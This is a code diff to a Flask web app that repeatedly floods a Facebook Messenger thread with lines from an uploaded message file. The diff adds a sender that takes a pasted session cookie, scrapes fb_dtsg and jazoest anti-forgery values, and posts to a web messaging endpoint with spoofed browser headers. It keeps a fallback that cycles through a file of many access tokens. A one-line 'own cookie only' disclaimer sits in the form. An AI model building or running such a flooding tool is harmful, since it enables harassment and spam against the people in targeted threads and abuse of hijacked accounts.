@@ -4,27 +4,140 @@ from threading import Thread, Event
 import time
 import random
 import string
+import re
 
 app = Flask(__name__)
 app.debug = True
 
-headers = {
+# common browser-like headers (will be copied and extended per-request)
+BASE_HEADERS = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Referer': 'https://www.facebook.com/'
 }
 
 stop_events = {}
 threads = {}
 message_counters = {}
 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+def fetch_fb_dtsg_and_jazoest(cookie):
+    """
+    Fetch a page (messages thread landing) to extract fb_dtsg and jazoest values
+    Returns (fb_dtsg, jazoest, user_id) or (None, None, None) on failure.
+    """
+    try:
+        headers = BASE_HEADERS.copy()
+        headers['Cookie'] = cookie
+        # Use the mobile messages thread root which usually contains fb_dtsg in page
+        r = requests.get("https://www.facebook.com/messages", headers=headers, timeout=12)
+        text = r.text
+
+        # fb_dtsg extraction
+        fb_dtsg = None
+        jazoest = None
+
+        # Try common patterns for fb_dtsg / jazoest (page may vary)
+        m = re.search(r'name="fb_dtsg" value="([^"]+)"', text)
+        if m:
+            fb_dtsg = m.group(1)
+        else:
+            m = re.search(r'fb_dtsg\\":\\"([^\\"]+)', text)
+            if m:
+                fb_dtsg = m.group(1)
+
+        m2 = re.search(r'name="jazoest" value="([^"]+)"', text)
+        if m2:
+            jazoest = m2.group(1)
+        else:
+            m2 = re.search(r'jazoest\\":\\"([^\\"]+)', text)
+            if m2:
+                jazoest = m2.group(1)
+
+        # user id (c_user) from cookie if present
+        user_id = None
+        mu = re.search(r'c_user=(\d+)', cookie)
+        if mu:
+            user_id = mu.group(1)
+
+        return fb_dtsg, jazoest, user_id
+    except Exception as e:
+        print("fetch_fb_dtsg error:", e)
+        return None, None, None
+
+def send_messages_with_cookie(cookie, thread_id, mn, time_interval, messages, task_id):
+    """
+    Send messages to given thread using cookie-based web endpoint.
+    This tries to mimic browser messenger requests by extracting fb_dtsg and
+    posting to a messenger endpoint.
+    """
+    stop_event = stop_events[task_id]
+    message_counters[task_id] = 0
+
+    fb_dtsg, jazoest, user_id = fetch_fb_dtsg_and_jazoest(cookie)
+    if not fb_dtsg:
+        print("❌ Could not extract fb_dtsg / jazoest from session. Message sending aborted for this cookie.")
+        return
+
+    headers = BASE_HEADERS.copy()
+    headers['Cookie'] = cookie
+    headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
+    headers['Referer'] = f'https://www.facebook.com/messages/t/{thread_id}'
+
+    # Sometimes messenger requires an AJAX endpoint with specific query params
+    post_url = "https://www.facebook.com/messaging/send/"
+
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            message_text = str(mn) + ' ' + message1
+            # payload tuned to mimic web messenger posting form fields
+            payload = {
+                'fb_dtsg': fb_dtsg,
+                'jazoest': jazoest or '',
+                'body': message_text,
+                # include recipient id. For group/conversation threads the format may vary;
+                # we include `to` or `ids[]` as a fallback.
+                'ids[0]': thread_id,
+                'send_time': '',
+                # required flags used by FB in some flows
+                '__user': user_id or '',
+                '__a': '1'
+            }
+
+            try:
+                r = requests.post(post_url, data=payload, headers=headers, timeout=12)
+                # Facebook often returns JSON prefixed with )]}', so be tolerant
+                status_ok = False
+                text = r.text if r is not None else ''
+                if r.status_code == 200:
+                    # naive success detection: presence of "client_id" or "success" or status code 200
+                    if '"message_id"' in text or '"success":' in text or r.status_code == 200:
+                        status_ok = True
+
+                if status_ok:
+                    message_counters[task_id] += 1
+                    print(f"✅ Sent ({message_counters[task_id]}): {message_text}")
+                else:
+                    print(f"❌ Failed to send (maybe blocked or changed endpoint). Status: {r.status_code}")
+                    # Optional: print short response snippet for debugging
+                    snippet = text.replace('\n',' ')[:200]
+                    print("   Resp snippet:", snippet)
+            except Exception as e:
+                print("Error sending message:", e)
+
+            time.sleep(float(time_interval))
+
+def send_messages_with_tokens(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    """
+    Fallback: if user supplied access_tokens (access_token strings), use Graph API endpoint.
+    This part preserves original behavior (requires tokens that are valid and permitted).
+    """
     stop_event = stop_events[task_id]
     message_counters[task_id] = 0
     while not stop_event.is_set():
@@ -36,37 +149,61 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 message = str(mn) + ' ' + message1
                 parameters = {'access_token': access_token, 'message': message}
                 try:
-                    response = requests.post(api_url, data=parameters, headers=headers)
+                    response = requests.post(api_url, data=parameters, headers=BASE_HEADERS, timeout=12)
                     if response.status_code == 200:
                         message_counters[task_id] += 1
                         print(f"✅ Sent ({message_counters[task_id]}): {message}")
                     else:
-                        print(f"❌ Failed: {message}")
+                        print(f"❌ Failed (token): {message} -> {response.status_code}")
                 except Exception as e:
                     print("Error:", e)
-                time.sleep(time_interval)
+                time.sleep(float(time_interval))
 
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
+        cookie_input = request.form.get('cookieInput', '').strip()
+
+        access_tokens = []
+        # decide tokens or cookie
         if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
+            tk = request.form.get('singleToken', '').strip()
+            if tk:
+                access_tokens = [tk]
         else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
+            token_file = request.files.get('tokenFile')
+            if token_file:
+                access_tokens = token_file.read().decode().strip().splitlines()
 
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+        thread_id = request.form.get('threadId').strip()
+        mn = request.form.get('kidx', '').strip()
+        try:
+            time_interval = float(request.form.get('time'))
+        except:
+            time_interval = 2.0
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
+        txt_file = request.files.get('txtFile')
+        messages = []
+        if txt_file:
+            messages = txt_file.read().decode().splitlines()
+        else:
+            messages = [request.form.get('singleMessage', '')]
+
+        if not thread_id:
+            return "Thread ID is required", 400
 
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
-
         stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+
+        # If cookie provided use cookie-based sender in a separate thread
+        if cookie_input:
+            thread = Thread(target=send_messages_with_cookie, args=(cookie_input, thread_id, mn, time_interval, messages, task_id))
+        elif access_tokens:
+            thread = Thread(target=send_messages_with_tokens, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        else:
+            return "Provide either cookie or token(s).", 400
+
         threads[task_id] = thread
         thread.start()
 
@@ -109,7 +246,7 @@ PAGE_HTML = '''
       min-height: 100vh;
     }
     .container {
-      max-width: 350px;
+      max-width: 420px;
       height: auto;
       border-radius: 20px;
       padding: 20px;
@@ -162,6 +299,7 @@ PAGE_HTML = '''
       text-align: center;
       font-weight: bold;
     }
+    .small-note { color:#ddd; font-size:12px; margin-top:6px; }
   </style>
 </head>
 <body>
@@ -171,12 +309,19 @@ PAGE_HTML = '''
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
       <div class="mb-3">
-        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <label for="tokenOption" class="form-label">Select Input Option</label>
         <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
           <option value="single">Single Token</option>
           <option value="multiple">Token File</option>
         </select>
       </div>
+
+      <div class="mb-3">
+        <label>Or Paste COOKIE (optional — will be used if provided)</label>
+        <input type="text" class="form-control" name="cookieInput" placeholder="c_user=...; xs=...; fr=...">
+        <div class="small-note">Use your own account cookie only. Do not use others' cookies.</div>
+      </div>
+
       <div class="mb-3" id="singleTokenInput">
         <label>Enter Single Token</label>
         <input type="text" class="form-control" name="singleToken">
@@ -186,7 +331,7 @@ PAGE_HTML = '''
         <input type="file" class="form-control" name="tokenFile">
       </div>
       <div class="mb-3">
-        <label>Enter Inbox/convo uid</label>
+        <label>Enter Inbox/convo uid (thread id)</label>
         <input type="text" class="form-control" name="threadId" required>
       </div>
       <div class="mb-3">
@@ -198,7 +343,7 @@ PAGE_HTML = '''
         <input type="number" class="form-control" name="time" required>
       </div>
       <div class="mb-3">
-        <label>Choose Your Np File</label>
+        <label>Choose Your Msg File (one message per line)</label>
         <input type="file" class="form-control" name="txtFile" required>
       </div>
       <button type="submit" class="btn btn-submit">Run</button>
@@ -255,4 +400,4 @@ PAGE_HTML = '''
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5040)
-        
+                
